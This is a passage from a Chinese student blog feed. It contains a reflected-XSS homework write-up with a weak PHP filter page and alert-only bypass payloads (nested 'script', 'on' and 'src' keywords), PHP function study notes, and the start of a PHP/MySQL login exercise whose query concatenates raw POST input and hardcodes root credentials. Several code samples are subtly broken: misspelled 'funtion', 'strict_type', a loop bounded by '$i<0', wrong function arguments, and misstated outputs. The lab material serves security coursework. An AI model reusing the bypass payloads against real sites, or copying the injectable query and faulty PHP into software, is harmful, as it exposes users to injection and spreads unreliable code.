<p>版权：本文采用「<a href="https://creativecommons.org/licenses/by/4.0" target="_blank" rel="noopener">署名 4.0 国际</a>」知识共享许可协议进行许可。</p>
<p>分类: <a href="https://www.cnblogs.com/kyx599/category/1652509.html" target="_blank" rel="noopener">SQL注入</a></p>
<p>1</p>
<p>0</p>
<p>posted @ 2020-02-22 15:12 <a href="https://www.cnblogs.com/kyx599/" target="_blank" rel="noopener">&amp;delusion</a> 阅读(142) 评论(0) <a href="https://i.cnblogs.com/EditArticles.aspx?postid=12345471" target="_blank" rel="noopener">编辑</a> <a href="javascript:void(0)">收藏</a></p>
<p>注册用户登录后才能发表评论，请 <a href="javascript:void(0);">登录</a> 或 <a href="javascript:void(0);">注册</a>， <a href="https://www.cnblogs.com/" target="_blank" rel="noopener">访问</a> 网站首页。</p>
<p>Copyright © 2020 &amp;delusion<br>Powered by .NET Core on Kubernetes &amp; Theme <a href="https://github.com/esofar/cnblogs-theme-silence" target="_blank" rel="noopener">Silence v2.0.2</a>&amp; Theme <a href="https://github.com/esofar/cnblogs-theme-silence" target="_blank" rel="noopener">Silence v2.0.2</a></p>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>OWASP</tag>
        <tag>DVWA</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业十一：跨站脚本攻击</title>
    <url>/2020/06/08/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>复现课本实验三，通过img和script两类方式实现跨站脚本攻击，撰写实验报告，有能力者，可以自己撰写更安全的过滤程序</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>xss_test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	confirm(<span class="string">"congratulations"</span>);<span class="comment">// 确认对话框，验证攻击是否成功</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;--welcome to the simple xss test--&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="number">0</span>);</span><br><span class="line">$str=strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;Hello "</span>.htmlspecialchars($str).<span class="string">".&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=xss_test.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=Submit /&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword value="'</span>.$str4.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="script方法"><a href="#script方法" class="headerlink" title="script方法"></a>script方法</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%80/image-20200606153408601.png"  alt="image-20200606153408601"></p>
<p>查看网页源码</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606172501291.png"  alt="image-20200606172501291" style="zoom: 67%;">

<p>输入123</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606172530633.png"  alt="image-20200606172530633" style="zoom:67%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606172642371.png"  alt="image-20200606172642371" style="zoom:67%;">

<p>输入<code>&lt;script&gt; alert(&#39;123&#39;);&lt;/script&gt;</code></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606173234809.png"  alt="image-20200606173234809" style="zoom:67%;">

<p>猜测源代码中有替换<code>script</code>功能的代码，<code>htmlspecialchars</code>可以实现预定义字符的转换</p>
<p>输入<code>&lt;scrscriptipt&gt;alert(&#39;123&#39;);&lt;/scriscriptpt&gt;</code></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606173527497.png"  alt="image-20200606173527497" style="zoom:67%;">

<p>显示<code>&lt;script&gt; alert(\&#39;123\&#39;);&lt;/script&gt;</code></p>
<p>用<code>&quot;&gt;</code>替换高亮部分，是&lt;input 闭合</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606173850964.png"  alt="image-20200606173850964" style="zoom:67%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606173940533.png"  alt="image-20200606173940533" style="zoom:67%;">

<p>输入<code>&quot;&gt; &lt;scriscriptpt&gt;alert();&lt;/scscriptript&gt;</code></p>
<p>攻击成功（没有关闭双引号转义，攻击依然成功）</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606174834745.png"  alt="image-20200606174834745" style="zoom:67%;">

<h3 id="img方法"><a href="#img方法" class="headerlink" title="img方法"></a>img方法</h3><p>==&lt;img src=ops! onerror=”alert(‘XSS’)”&gt;==</p>
<p>&lt;img&gt;标签是用来定义HTML中的图像，src一般是图像的来源，而onerror事件会在文档或图像加载过程中发生错误是被触发。所以上面这个攻击脚本的逻辑是，当img加载一个错误的图像来源ops！时，回触发onerror事件，从而执行alert函数</p>
<p>在phpnow/php/php-apache2handler.ini中修改查找到的第二个magic_quotes_gpc=Off，关掉双引号转义</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606180957018.png"  alt="image-20200606180957018" style="zoom:67%;">

<p>输入<code>&quot;&gt;&lt;img srsrcc=ops! oonnerror=&quot;alert()&quot;&gt;</code></p>
<p>攻击成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十一/image-20200606181440535.png"  alt="image-20200606181440535" style="zoom:67%;">

<h3 id="更安全的过滤程序"><a href="#更安全的过滤程序" class="headerlink" title="更安全的过滤程序"></a>更安全的过滤程序</h3><p>循环检测输入语句中是否有<code>scripts</code>,<code>on</code>,<code>src</code>的关键字</p>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>跨站脚本攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>php学习三 —— 函数应用</title>
    <url>/2020/06/05/php/php3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note info">
            <p>参考书籍《细说PHP》</p>
          </div>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名<span class="params">([参数<span class="number">1</span>，参数<span class="number">2</span>，参数<span class="number">3</span>])</span>//参数不需要标明类型</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    函数体;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP7以后增加了对返回类型的声明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名<span class="params">([参数<span class="number">1</span>，参数<span class="number">2</span>，参数<span class="number">3</span>])</span> :类型</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    函数体;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>eg</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span><span class="params">(&amp;$left,&amp;$right)</span>:<span class="title">void</span></span>&#123;....&#125;</span><br><span class="line">......</span><br><span class="line">$a=<span class="number">1</span>;$b=<span class="number">2</span>;</span><br><span class="line">vardump(swap($a,$b),$a,$b);<span class="comment">//输出为NULL int(1) int(2)</span></span><br></pre></td></tr></table></figure>

<p>可以在参数前添加类型限制，默认为对不符合要求的形参进行强制类型转换</p>
<p>若使用严格模式，则参数不满足要求时会报TypeError</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//声明严格模式</span></span><br><span class="line">    <span class="keyword">declare</span>(strict_type=<span class="number">1</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> ......</span></span><br></pre></td></tr></table></figure>

<p>指定默认值：function demo($a=1); 允许使用NULL作为默认参数</p>
<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>在函数中无法使用全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $one=<span class="number">100</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $one;</span><br><span class="line">    &#125;</span><br><span class="line">	demo();<span class="comment">//输出结果为0或者空，因为为未初始化的初值</span></span><br></pre></td></tr></table></figure>

<p>在函数中如果想使用全局变量，应该使用下面的写法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $one=<span class="number">100</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $GLOBALS[<span class="string">'one'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">	demo();<span class="comment">//输出结果为0，因为为未初始化的初值</span></span><br></pre></td></tr></table></figure>

<p>在函数中声明静态变量：static $a=0;</p>
<h2 id="可变个数参数的函数"><a href="#可变个数参数的函数" class="headerlink" title="可变个数参数的函数"></a>可变个数参数的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">funtion more_args()&#123;</span><br><span class="line">    $args=func_get_args();	<span class="comment">//将所有传递给脚本函数的参数当作一个数组返回</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($args);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"第"</span>.$i.<span class="string">"个参数是"</span>.args[$i].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">more_args(<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more_args</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;func_num_args();$i++)</span><br><span class="line">        <span class="keyword">echo</span> func_get_args($i);</span><br><span class="line">&#125;</span><br><span class="line">more_args(<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>array(),echo(),array_merge()等函数也可以传递任意多个参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//&gt;=php5.6，使用...实现变长参数函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">(...$ints)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_sum($ints);<span class="comment">//返回数组所有成员求和的结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用不同个数的参数调用函数</span></span><br><span class="line">var_dump(sum(<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="number">4.1</span>,<span class="number">10</span>,<span class="keyword">true</span>));<span class="comment">//输出"float(20.1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//规定返回值类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sums</span><span class="params">(...$ints)</span>:<span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_sum($ints);<span class="comment">//返回数组所有成员求和的结果</span></span><br><span class="line">&#125;</span><br><span class="line">var_dump(sums(<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="number">4.1</span>,<span class="number">10</span>,<span class="keyword">true</span>));<span class="comment">//输出“int(20)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用...将数组和可便利对象展开为函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($a,$b,$c,$d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b+$c+$d;</span><br><span class="line">&#125;</span><br><span class="line">$operators=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">echo</span> add(<span class="number">1</span>,...$operators);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?,可以传递null参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">(?$string)</span></span>&#123;&#125;</span><br><span class="line">fun(<span class="string">'xxx'</span>);fun(<span class="keyword">null</span>);<span class="comment">//都可以</span></span><br><span class="line">fun();<span class="comment">//不行</span></span><br></pre></td></tr></table></figure>

<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><h3 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">($a,$b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">two</span><span class="params">($a,$b)</span></span>&#123;&#125;</span><br><span class="line">$result=<span class="string">"one"</span>;</span><br><span class="line"><span class="keyword">echo</span> $result(<span class="number">2</span>,<span class="number">3</span>);<span class="comment">//调用函数one</span></span><br></pre></td></tr></table></figure>

<p>变量函数不能应用于echo、print、unset、isset、empty、include、require</p>
<h3 id="使用变量函数声明应用和回调函数"><a href="#使用变量函数声明应用和回调函数" class="headerlink" title="使用变量函数声明应用和回调函数"></a>使用变量函数声明应用和回调函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($fun)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">100</span>;$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($fun($i))<span class="comment">//调用和变量值同名的函数</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $i.<span class="string">'&lt;br&gt;'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">($num)</span></span>&#123; <span class="keyword">return</span> $num%<span class="number">3</span>==<span class="number">0</span>;&#125;</span><br><span class="line">funtion two($num)&#123;<span class="keyword">return</span> $num==strrev($num);&#125;<span class="comment">//回文数</span></span><br><span class="line">filter(<span class="string">"one"</span>);<span class="comment">//打印出100以内的非3的倍数</span></span><br></pre></td></tr></table></figure>

<h3 id="借助call-user-func-array-函数自定义回调函数"><a href="#借助call-user-func-array-函数自定义回调函数" class="headerlink" title="借助call_user_func_array()函数自定义回调函数"></a>借助call_user_func_array()函数自定义回调函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">funtion fun($a,$b)&#123;&#125;</span><br><span class="line">call_user_func_array(<span class="string">'fun'</span>,<span class="keyword">array</span>($a,$b));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($fun)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">0</span>;$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(call_user_func_array($fun,<span class="keyword">array</span>($i)))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $i.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="类静态函数和对象的方法回调"><a href="#类静态函数和对象的方法回调" class="headerlink" title="类静态函数和对象的方法回调"></a>类静态函数和对象的方法回调</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    funtion fun()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="string">"Demo"</span>,<span class="string">"fun"</span>),<span class="keyword">array</span>(<span class="string">"aaa"</span>,<span class="string">"bbb"</span>));</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="keyword">new</span> test(),<span class="string">"fun"</span>),<span class="keyword">array</span>(<span class="string">"brophp"</span>,<span class="string">"学习型php"</span>))</span><br></pre></td></tr></table></figure>

<h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><h3 id="使用自定义库和函数"><a href="#使用自定义库和函数" class="headerlink" title="使用自定义库和函数"></a>使用自定义库和函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span> <span class="string">'config.php'</span>;<span class="comment">//使用require语句包含并执行config.php文件</span></span><br><span class="line">	<span class="keyword">if</span>($condition)</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'file.txt'</span>;<span class="comment">//使用include语句在，包含并执行file.txt文件</span></span><br><span class="line">	<span class="keyword">require</span> (<span class="string">'somefile.txt'</span>);<span class="comment">//使用require包含并执行</span></span><br></pre></td></tr></table></figure>

<p>include在流程控制中使用，当php脚本读到它时，才将它包含的文件都进来</p>
<p>require在文件的开头和结尾使用，在脚本执行前读入索隐入的文件</p>
<p>include_once()\require_once() 文件只能被包括一次，避免函数重定义及变量重新赋值等问题</p>
<h3 id="php匿名函数和闭包"><a href="#php匿名函数和闭包" class="headerlink" title="php匿名函数和闭包"></a>php匿名函数和闭包</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fun=funtion($param)&#123;<span class="comment">//将一个没有名字的函数赋值给一个变量$fun</span></span><br><span class="line">    <span class="keyword">echo</span> $param;</span><br><span class="line">&#125;</span><br><span class="line">$fun(<span class="string">'abcd'</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业十：WEB开发实践</title>
    <url>/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>复现课本第九章的实验三：利用php编写简单的数据库插入、查询和删除操作的示例</p>
<p>基于课本的完整例子，进一步了解WEB开发的细节</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="0-php学习"><a href="#0-php学习" class="headerlink" title="0.php学习"></a>0.php学习</h3><p>登录界面</p>
<p>login.htm</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">method</span> = <span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"login.php"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"900"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"username"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span>口令<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"pwd"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"pwd"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">type</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=$_POST[<span class="string">'username'</span>];</span><br><span class="line">$pwd=$_POST[<span class="string">'pwd'</span>];</span><br><span class="line">$SQLStr=<span class="string">"select * from userinfo where username='$username' and pwd='$pwd'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $SQLStr;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十/image-20200525164957952.png"  alt="image-20200525164957952" style="zoom:67%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十/image-20200525172054454.png"  alt="image-20200525172054454" style="zoom:67%;"></p>
<p>链接数据库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>);<span class="comment">//connect to database</span></span><br><span class="line">$username=$_POST[<span class="string">'username'</span>];</span><br><span class="line">$pwd=$_POST[<span class="string">'pwd'</span>];</span><br><span class="line">$SQLStr=<span class="string">"select * from userinfo where username='$username' and pwd='$pwd'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $SQLStr;</span><br><span class="line">$result=mysql_db_query(<span class="string">"testDB"</span>,$SQLStr,$conn);<span class="comment">//execute sql</span></span><br><span class="line"><span class="comment">// fetch the result</span></span><br><span class="line"><span class="keyword">if</span>($row=mysql_fetch_array($result))</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;OK&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;false&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//release</span></span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="comment">//close connection</span></span><br><span class="line">mysql_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查询数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"roor"</span>,<span class="string">"123456"</span>);</span><br><span class="line">$SQLStr=<span class="string">"select * from userinfo"</span>;</span><br><span class="line"><span class="keyword">echo</span> $SQLStr;</span><br><span class="line">$result=mysql_db_query(<span class="string">"testDB"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>);</span><br><span class="line"><span class="comment">//获取查询结果</span></span><br><span class="line"><span class="keyword">if</span>($rrow=mysql_fetch_array($result))<span class="comment">//通过循环读取内容</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;OK...表内容&lt;br&gt;"</span>;</span><br><span class="line">	<span class="comment">//定位到第一条记录</span></span><br><span class="line">	mysql_data_seek($reult,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//循环取出记录</span></span><br><span class="line">	<span class="keyword">while</span>($row=mysql_fetch_row($result))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;mysql_num_fields($result);$i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $row[$i];</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">" | "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	&#123;<span class="keyword">echo</span> <span class="string">"&lt;br&gt;false&lt;br&gt;"</span>;&#125;</span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="comment">//关闭连接</span></span><br><span class="line">mysql_close($conn);</span><br></pre></td></tr></table></figure>



<h3 id="1-创建数据库和表"><a href="#1-创建数据库和表" class="headerlink" title="1.创建数据库和表"></a>1.创建数据库和表</h3><p>创建数据库testDB</p>
